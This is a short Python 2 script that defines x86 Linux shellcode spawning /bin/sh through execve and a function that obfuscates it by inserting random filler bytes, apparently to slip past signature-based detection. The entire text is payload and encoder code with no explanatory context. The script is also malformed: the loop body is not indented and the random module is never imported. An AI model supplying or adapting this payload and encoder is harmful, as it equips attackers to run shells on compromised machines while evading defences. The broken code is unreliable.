shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
             "\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
 
randInsert = [0x27,0x37,0xd7,0xef,0xc3]
 
def generate_insertion_encoded_shellcode():
    print '[*] Generate random insertion encoded shellcode...'
    encoded_shellcode = ""
    for x in bytearray(shellcode):
    # pick a random byte to insert
    rn = random.choice(randInsert)
    # for that extra bit of random
    if (random.randint(1,1000)) > 500:
        encoded_shellcode += '0x'
        encoded_shellcode += '%02x,' %x
        encoded_shellcode += '0x%02x,' % rn
    else:
        encoded_shellcode += '0x'
        encoded_shellcode += '%02x,' %x
    return encoded_shellcode
